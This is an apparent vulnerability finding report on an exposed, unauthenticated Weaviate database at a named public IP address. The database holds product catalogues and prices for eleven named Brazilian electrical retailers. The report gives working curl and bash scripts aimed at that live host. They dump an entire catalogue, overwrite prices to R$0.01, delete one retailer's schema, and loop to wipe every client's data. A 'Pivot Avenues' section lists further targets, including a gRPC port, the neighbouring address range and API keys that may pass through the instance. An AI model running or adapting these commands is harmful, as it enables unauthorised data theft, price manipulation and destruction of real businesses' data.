# Brazilian Electrical Retail AI Platform -- Unauth RWD, 86K Product Records

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

```
IP:       34.39.219.41
Port:     8080  (Weaviate)
          50051 (gRPC -- nmap open, weavscan inconclusive)
Service:  Weaviate 1.33.2
Hosting:  Google Cloud Platform, São Paulo, Brazil
RDNS:     41.219.39.34.bc.googleusercontent.com
Auth:     NONE
Modules:  37 AI provider integrations
```

---

## System Identification

Multi-tenant AI-powered product search and recommendation engine for Brazilian electrical supply / hardware retailers. Each retail client gets a dedicated Weaviate class (Inventory{N}) containing their full product catalog with retail pricing.

---

## Modules (37)

```
Vectorizers:  text2vec-openai, text2vec-cohere, text2vec-aws, text2vec-google,
              text2vec-huggingface, text2vec-jinaai, text2vec-voyageai,
              text2vec-weaviate, text2vec-mistral, text2vec-nvidia,
              text2vec-morph, text2vec-octoai, text2vec-databricks,
              multi2vec-google, multi2vec-jinaai, multi2vec-nvidia,
              multi2vec-aws, multi2vec-cohere, multi2vec-voyageai,
              text2multivec-jinaai, multi2multivec-jinaai

Generative:   generative-openai, generative-anthropic, generative-google,
              generative-cohere, generative-aws, generative-mistral,
              generative-xai, generative-nvidia, generative-anyscale,
              generative-octoai, generative-friendliai, generative-databricks

Rerankers:    reranker-jinaai, reranker-cohere, reranker-nvidia,
              reranker-voyageai
```

Keys are client-supplied per-request (not in server env).

---

## Data (13 Classes, ~86,012 Records)

### Client Map

| Class | id_cliente | Cliente | Records |
|-------|-----------|---------|---------|
| Inventory1 | 1 | Loja Teste | 7,201 |
| Inventory3 | 3 | Eletrica Gerais | 7,200 |
| Inventory4 | 4 | Selva Aquática | 7,201 |
| Inventory5 | 5 | Elétrica Store Ltda. | 7,200 |
| Inventory6 | 6 | (empty) | 0 |
| Inventory7 | 7 | (empty) | 0 |
| Inventory8 | 8 | Loja do Índio | 4,704 |
| Inventory9 | 9 | Loja da Lâmpada | 16,904 |
| Inventory10 | 10 | Loja das Velas | 7,200 |
| Inventory11 | 11 | Luminária | 7,200 |
| Inventory12 | 12 | Eletropassos | 7,200 |
| Inventory13 | 13 | BWA | 7,001 |
| Inventory14 | 14 | Material Elétrico | 7,001 |

**Total active clients: 11. Total records: ~86,012.**

### Per-Record Schema

```
item_id               int      -- internal product ID
item_cod              text     -- SKU / product code
item_name             text     -- full product name (Portuguese)
item_normalized_name  text     -- normalized search name
item_brand            text     -- brand
item_category         text     -- product category
item_unity            text     -- unit of measure (UN, CX, RL, etc.)
item_price            number   -- RETAIL PRICE (BRL)
alternative_names     text[]   -- alternative search names
item_user_preference_score number -- AI recommendation score
num_inventario        int      -- inventory batch number
cliente               text     -- client store name
id_cliente            int      -- client ID
```

### Sample Products (Inventory3 -- Eletrica Gerais)

```
R$  37.60  ferramentas_manuais_e_eletrica    SERRA COPO 25MM STARRETT
R$ 366.94  materiais_hidraulicos             DUCHA ADVAN TURBO ELETRO 127V LORENZETTI
R$ 165.88  dispositivos_de_protecao          RELE TERM 11-17A RW27-2D3-U017 WEG
R$ 133.93  iluminacao_e_acessorios           REATOR VAP METAL/SODIO RVMTE 250W QUALIT
R$  10.21  automacao_controle_e_sens         SINALEIRA LED LK16-22 AM 110V LUKMA
```

### Sample Products (Inventory9 -- Loja da Lâmpada)

```
R$  17.89  hardware                          PARAFUSO CABECA CHATA 3,0 X 25 MM CX C/ 500
R$  72.35  acabamentos                       FITA DE BORDO CACAU GRANN 022MM X 50MTS (BERNECK)
R$  50.70  dispositivos_de_protecao          DISJUNTOR DIN 2 X 70 SHB-GII SOPRANO
R$  25.81  acabamentos                       FILETE SANTA LUZIA IPE ESCURO 2,8 - 23,5 X 8MM
R$  29.25  cabos_e_fios                      EXTENSAO CORDAO PARAL TRIPLA PT 5M CORFIO
```

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| Read | YES | 200 |
| Write | YES -- STATUS=SUCCESS | 200 |
| Delete | YES | 204 |

Canary: `1869c010-be1e-4280-a705-c62e4de967a0` -- written to Inventory9, confirmed, deleted 204, verify 404.

---

## PoC

### Read -- Full catalog for one retailer

```bash
TARGET=http://34.39.219.41:8080

# All products for Loja da Lâmpada (16,904 records) with pricing
AFTER=""
while true; do
  if [ -z "$AFTER" ]; then
    Q='{"query":"{ Get { Inventory9(limit: 100) { item_name item_cod item_price item_category item_brand _additional { id } } } }"}'
  else
    Q="{\"query\":\"{ Get { Inventory9(limit: 100, after: \\\"$AFTER\\\") { item_name item_cod item_price item_category item_brand _additional { id } } } }\"}"
  fi
  RESULT=$(curl -s -X POST $TARGET/v1/graphql -H "Content-Type: application/json" -d "$Q")
  echo $RESULT >> loja-lampada-catalog.jsonl
  COUNT=$(echo $RESULT | jq '.data.Get.Inventory9 | length')
  [ "$COUNT" -lt 100 ] && break
  AFTER=$(echo $RESULT | jq -r '.data.Get.Inventory9[-1]._additional.id')
done
```

### Write -- Price manipulation

```bash
# Find a product's UUID, then overwrite its price
UUID=$(curl -s -X POST $TARGET/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ Get { Inventory9(where: {path:[\"item_cod\"],operator:Equal,valueText:\"7141\"}) { _additional { id } item_name item_price } } }"}' \
  | jq -r '.data.Get.Inventory9[0]._additional.id')

# Overwrite with manipulated price
curl -s -X PUT $TARGET/v1/objects/Inventory9/$UUID \
  -H "Content-Type: application/json" \
  -d "{\"class\":\"Inventory9\",\"properties\":{\"item_price\":0.01,\"item_name\":\"DISJUNTOR DIN 2 X 70\",\"cliente\":\"Loja da Lâmpada\",\"id_cliente\":9,\"item_cod\":\"7141\",\"item_unity\":\"UN\"}}"
# AI recommender now surfaces this product as R$0.01
```

### Delete -- Wipe one retailer's catalog

```bash
curl -X DELETE $TARGET/v1/schema/Inventory9
# 16,904 products + all vector embeddings gone
# Loja da Lâmpada's AI search returns empty
```

### Delete -- Full platform wipe

```bash
for N in 1 3 4 5 6 7 8 9 10 11 12 13 14; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE "$TARGET/v1/schema/Inventory$N")
  echo "Inventory$N: $CODE"
done
# All 11 retail clients lose their AI product search
```

---

## Topology

```
node: node1  status=HEALTHY  version=1.33.2
gRPC :50051: open (nmap)
lastSnapshotIndex: [not probed]
```

---

## Impact

### Read -- Competitor Pricing Intelligence
86,012 products with live retail prices across 11 Brazilian electrical supply stores. A competitor retailer can exfiltrate every SKU, price, and category from every client on the platform in minutes. Real-time pricing intelligence without any account.

### Write -- Price Manipulation
Unauthenticated PUT to `/v1/objects/{class}/{uuid}` overwrites any record. An attacker can:
- Set competitor prices to R$0.01 -- surfaces their products as the cheapest in semantic search
- Remove high-margin products from recommendations (set `item_user_preference_score` to negative)
- Inject phantom SKUs with attacker-controlled product names/descriptions

AI recommendation scores (`item_user_preference_score`) influence what the platform surfaces to end customers. Manipulation directly affects retail sales outcomes.

### Delete -- Platform Disruption
Schema delete destroys a retailer's entire AI search catalog. For a store with 16,904 products (Loja da Lâmpada), this means customers searching "circuit breaker" or "LED fixture" get zero results until the platform re-indexes from source. The `num_inventario` batch number suggests re-ingestion is manual or scheduled -- recovery time unknown.

---

## Pivot Avenues

1. **gRPC :50051** -- nmap reports open; weavscan probe inconclusive; verify with `grpcurl` for additional unauth surface
2. **PUT /v1/objects/{class}/{uuid}** -- full record overwrite without auth; price manipulation at scale
3. **Inventory6/7 empty classes** -- clients 6 and 7 have schemas but no data; may represent provisioned but not yet onboarded customers
4. **37 AI modules** -- `generative-anthropic`, `generative-openai` etc. if any client supplies keys via the platform, those keys pass through this Weaviate instance
5. **GCP São Paulo neighborhood** -- 34.39.219.0/24; operator's app backend likely co-located

---

## Tool Reference

Found with **weavscan**.
https://github.com/nuclide-research/weavscan
